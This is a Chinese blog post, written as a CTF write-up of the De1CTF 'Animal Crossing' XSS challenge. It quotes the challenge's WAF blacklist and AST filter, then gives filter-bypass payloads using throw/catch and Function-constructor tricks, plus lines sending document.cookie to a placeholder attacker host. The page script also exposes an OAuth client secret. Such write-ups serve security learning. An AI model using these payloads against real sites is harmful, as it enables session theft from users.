@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    De1CTF Animal Crossing 复现 |
+    
+    Mount4in</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Mount4in" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-De1CTF-Animal-Crossing-复现" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      De1CTF Animal Crossing 复现
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/" class="article-date">
+  <time datetime="2020-05-14T04:04:47.000Z" itemprop="datePublished">2020-05-14</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        
+        <p>记录复现DE1CTF 的Animal Crossing</p>
+<a id="more"></a>
+
+<h1 id="Animal-Crossing"><a href="#Animal-Crossing" class="headerlink" title="Animal Crossing"></a>Animal Crossing</h1><p>题目是一个可以自己编辑的通行证，然后可以将编辑好的链接发送给管理员，那么就应该是xss打cookie了.</p>
+<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514120745790.png" alt="image-20200514120745790"></p>
+<p>首先发现存在CSP</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;;object-src &#39;none&#39;;</span><br></pre></td></tr></table></figure>
+
+<p>上述CSP可以利用<code>location.href  =  &quot;http://dddddd&quot;+document.cookie</code>来绕过.</p>
+<p>经过测试发现对island和image和fruit都进行了编码，然后对data数据进行了检测，比赛时没有探测出检测的规则（其实时不会xss）,赛后看了官方的writeup知道题目设置了两层waf</p>
+<blockquote>
+<h3 id="第一层：黑名单检测"><a href="#第一层：黑名单检测" class="headerlink" title="第一层：黑名单检测"></a>第一层：黑名单检测</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var blackList &#x3D; []string&#123;</span><br><span class="line">	&#x2F;&#x2F;global</span><br><span class="line">	&quot;document&quot;, &quot;window&quot;, &quot;top&quot;, &quot;parent&quot;, &quot;global&quot;, &quot;this&quot;,</span><br><span class="line">	&#x2F;&#x2F;func</span><br><span class="line">	&quot;console&quot;, &quot;alert&quot;, &quot;log&quot;, &quot;promise&quot;, &quot;fetch&quot;, &quot;eval&quot;, &quot;import&quot;,</span><br><span class="line">	&#x2F;&#x2F;char</span><br><span class="line">	&quot;&lt;&quot;, &quot;&gt;&quot;, &quot;&#96;&quot;, &quot;\\*&quot;, &quot;&amp;&quot;, &quot;#&quot;, &quot;%&quot;, &quot;\\\\&quot;,</span><br><span class="line">	&#x2F;&#x2F;key</span><br><span class="line">	&quot;if&quot;, &quot;set&quot;, &quot;get&quot;, &quot;with&quot;, &quot;yield&quot;, &quot;async&quot;, &quot;wait&quot;, &quot;func&quot;, &quot;for&quot;, &quot;error&quot;, &quot;string&quot;,</span><br><span class="line">	&#x2F;&#x2F;string</span><br><span class="line">	&quot;href&quot;, &quot;location&quot;, &quot;url&quot;, &quot;cookie&quot;, &quot;src&quot;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>黑名单的绕过思路无非避开被ban的字符串和字符，这里因为go的iris框架问题（看不出来是golang吧），导致<code>;</code>后的东西会被删掉，可以用%0a绕过</p>
+<h3 id="第二层：静态语法分析"><a href="#第二层：静态语法分析" class="headerlink" title="第二层：静态语法分析"></a>第二层：静态语法分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. 将data传入&#96;fmt.Sprintf(&quot;&#39;%s&#39;;&quot;, data)&#96;，然后进行语法解析，这里parse失败直接ban</span><br><span class="line">2. 接着遍历AST进行分析：</span><br><span class="line">   1. VariableExpression&#x2F;AssignExpression，所有声明语句&#x2F;赋值语句直接ban</span><br><span class="line">   2. CallExpression，所有函数调用的，且callee不为Identifier的直接ban</span><br><span class="line">      1. ban：&#96;test.test()&#96;、&#96;a[x]()&#96;</span><br><span class="line">      2. pass：&#96;test()&#96;</span><br><span class="line">   3. BracketExpression，也就是成员引用，Member不为Identifier的直接ban，</span><br><span class="line">      1. ban：&#96;a[1]&#96;、&#96;a[&#39;xx&#39;]&#96;</span><br><span class="line">      2. pass：&#96;a[x]&#96;</span><br></pre></td></tr></table></figure>
+
+<p>这一层waf，其实只要摸清ban的套路，针对性找到没被处理的语法来绕过即可，这里我的预期解是用throw传递变量，但是还有很多其他能用的语法（事实证明确实有很多)</p>
+</blockquote>
+<p>有黑名单的检测还有对语法的检测，这里如果解析语法出错直接ban，然后禁止声明和赋值语句，</p>
+<blockquote>
+<p>VariableExpression（变量表达式）</p>
+<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514175330303.png" alt="image-20200514175330303"></p>
+<p>AssignExpression（赋值语句）</p>
+<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514183823187.png" alt="image-20200514183823187"></p>
+<p>Identifier（标识符）</p>
+<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514183717571.png" alt="image-20200514183717571"></p>
+<p>CallExpression（调用表达式）</p>
+<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514183650960.png" alt="image-20200514183650960"></p>
+<p>BracketExpression（括号表达式，就是成员引用）</p>
+<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514183743248.png" alt="image-20200514183743248"></p>
+</blockquote>
+<p>综上，在data中不能出现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">let a &#x3D; &#39;dd&#39;;</span><br><span class="line">a &#x3D; &quot;ddddd&quot;;</span><br><span class="line">window.open(&quot;dd&quot;);</span><br><span class="line">window[&#39;open&#39;](&quot;dd&quot;);</span><br><span class="line">等等之类的</span><br></pre></td></tr></table></figure>
+
+<p>这里现贴上出题人的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWxlcnQoMSk&#x3D;%27%0atry&#123;throw%20%27ev%27%2b%27al%27&#125;catch(e)&#123;try&#123;throw%20frames[e]&#125;catch(c)&#123;c(atob(data))&#125;&#125;%0a&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>alert(1)&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;YWxlcnQoMSk=</p>
+<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514200937385.png" alt="image-20200514200937385"></p>
+<p>把题目里的部分代码抠出来，出题人的payload如下图所示：</p>
+<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514210649103.png" alt="image-20200514210649103"></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">data=<span class="string">'YWxlcnQoMSk='</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">'ev'</span> + <span class="string">'al'</span></span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> frames[e]</span><br><span class="line">    &#125; <span class="keyword">catch</span>(c) &#123;</span><br><span class="line">        c(atob(data))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure>
+
+<p>测试发现确实能够绕过waf，之前也没有用过go,所以出题人的这句话没清楚什么意思，有知道的师傅可以给我讲讲。</p>
+<blockquote>
+<p>这里因为go的iris框架问题（看不出来是golang吧），导致<code>;</code>后的东西会被删掉，可以用%0a绕过</p>
+</blockquote>
+<p>将<code>location.href = &quot;http://vps:8888/?flag=&quot;+document.cookie</code>base64编码，然后发过去</p>
+<p>另外记录下一叶飘零师傅的payload，感觉采用的方法和NPUCTF的验证🐎那道题很像，先贴出payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data&#x3D;&#39;||&#123;%22valueOf%22:new%20%22%22.constructor.constructor(atob(%27YWxlcnQoMSk&#x3D;%27))&#125;%2b1&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514230451345.png" alt="image-20200514230451345"></p>
+<p>原理是利用</p>
+<blockquote>
+<p>在一元加操作符操作对象的时候，会先调用对象的valueOf方法来转换，</p>
+</blockquote>
+<p>从之前的验证码那题可以知道，Math+1会因为Object与字符串拼接后原型会变成String，然后String的constructor为Function，这里利用<code>new &#39;&#39;.constructor.constructor(atob(&#39;YWxlcnQoMSk=&#39;))</code>得到一个函数，但是不能自动执行，</p>
+<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514231244338.png" alt="image-20200514231244338"></p>
+<p>从前面也看到waf ban了test.test()这种形式的函数，然后就可以利用前面的trick来进行函数的触发，如下图所示：</p>
+<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514231918146.png" alt="image-20200514231918146"></p>
+<p>然后将</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">btoa(&#39;location&#x3D;&quot;http:&#x2F;&#x2F;ip&#x2F;?flag&#x3D;&quot;+document.cookie&#39;)</span><br><span class="line"></span><br><span class="line">&#x2F;passport?image&#x3D;%2Fstatic%2Fhead.jpg&amp;island&#x3D;mount&amp;fruit&#x3D;&amp;name&#x3D;mount&amp;data&#x3D;&#39;||&#123;%22valueOf%22:new%20%22%22.constructor.constructor(atob(%27ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd%27))&#125;%2b1&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>在本地用docker复现时老是报500，遂罢。</p>
+<p>这样这得到了半个flag，然后要得到后半部分要读出服务器的400张图片，这点可以通过读取document.body.innerHTML来得到，然后后面有三种方法去得到这400张图片</p>
+<p>法一：</p>
+<ol>
+<li>将截图库放到png，上传到/upload,绕过CSP，执行截图库</li>
+<li>然后利用<code>fetch(</code>/static/images/xxxxxxxxx.png<code>).then(res=&gt;res.text()).then(txt=&gt;eval(txt))</code>执行</li>
+</ol>
+<p>法二：</p>
+<blockquote>
+<p>用for循环把400个图全部传到/upload，获取400个图片地址然后回传</p>
+</blockquote>
+<p>法三：</p>
+<blockquote>
+<p>直接读取图片回传，可以是写脚本一张一张传，也可以是用for循环批量传，但是回传过程需要编码转换，传回去后也需要再转成图片进行拼接</p>
+</blockquote>
+<p>参考</p>
+<p><a href="https://www.codemonster.cn/2020/05/06/2020-de1ctf-animal-crossing-writeup/#more" target="_blank" rel="noopener">https://www.codemonster.cn/2020/05/06/2020-de1ctf-animal-crossing-writeup/#more</a></p>
+<p><a href="https://www.4hou.com/posts/EGlN" target="_blank" rel="noopener">https://www.4hou.com/posts/EGlN</a></p>
+<p><a href="https://segmentfault.com/a/1190000015660623" target="_blank" rel="noopener">https://segmentfault.com/a/1190000015660623</a></p>
+
+      
+    </div>
+  </div>
+  <!-- 要添加的内容 -->
+  
+    <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>作者:  </strong>Mount4in</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>文章链接:  </strong>
+          <a href="/2020/05/14/De1CTF-Animal-Crossing-复现/" target="_blank" title="De1CTF Animal Crossing 复现">http://mount4in.github.io/2020/05/14/De1CTF-Animal-Crossing-复现/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>版权声明:   </strong>
+            本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            许可协议。转载请注明出处!
+          </li>
+        </ul>
+      <div>
+
+  
+  <!---->
+    <footer class="article-footer">
+      <a data-url="http://mount4in.github.io/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/" data-id="clg20p5l0000c14uv4cyi2z4m"
+         class="article-share-link">Share</a>
+      
+    </footer>
+
+
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            第五空间智能安全大赛Web题解
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">2020年网鼎杯WEB-writeup</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: 'b7d32ae2538e1a71f462',
+      clientSecret: 'da0452b610458a4ccbc38598fb0d02f0eb9e653d',
+      repo: 'gitalk',
+      owner: 'Mount4in',
+      admin: ['Mount4in'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2023 Mount4in</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="Mount4in"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
